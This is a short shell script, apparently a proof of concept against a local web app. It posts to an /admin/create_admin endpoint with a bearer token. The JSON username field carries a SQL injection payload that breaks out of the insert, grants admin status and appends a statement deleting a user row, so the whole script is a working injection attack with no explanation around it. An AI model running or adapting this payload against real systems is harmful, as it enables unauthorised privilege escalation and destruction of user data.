#!/bin/sh

# Run script as follows:
# ./create_admin_injection.sh [TOKEN] [ADMIN USERNAME TO CREATE]
# 
# Script will also delete a pre-existing user

TOKEN="$1"

RESP=$(curl -X POST http://localhost:5000/admin/create_admin \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d @- <<EOF
{
  "username": "$RANDOM', 'bar', '$RANDOM', true); DELETE FROM users WHERE username = 'foo'; --",
  "password": "flower"
}
EOF
)

echo "$RESP"
